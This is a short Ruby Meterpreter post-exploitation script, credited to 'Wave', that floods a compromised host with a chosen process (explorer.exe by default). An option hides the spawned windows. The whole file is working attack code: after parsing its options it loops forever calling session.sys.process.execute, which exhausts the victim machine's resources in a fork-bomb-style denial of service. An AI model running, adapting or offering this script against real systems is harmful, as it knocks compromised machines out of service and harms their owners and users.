# Author: Wave
print_status("Hello World")
print_status("flood the host with a process")
hidden = 0
process = "explorer.exe"
print_error("note that some process cannot be hidden")
print_good("default setup is preety effective ;\)")
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
 "-p"  => [ true,  "process to run"],
 "-hd"  => [ false,  "hide the process"],
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
  print_line("Meterpreter Script to flood host with a process")
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end
#########register options#######
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-p"
    process = val
  when "-hd"
    hidden = 1
end
}
#########FLOODING!!!!!!!!!!!#############
if hidden == 1
while(1 == 1)
session.sys.process.execute("#{process}", nil, {'Hidden' => true})
end
else
while(1 == 1)
session.sys.process.execute("#{process}", nil, {'Hidden' => false})
end
end
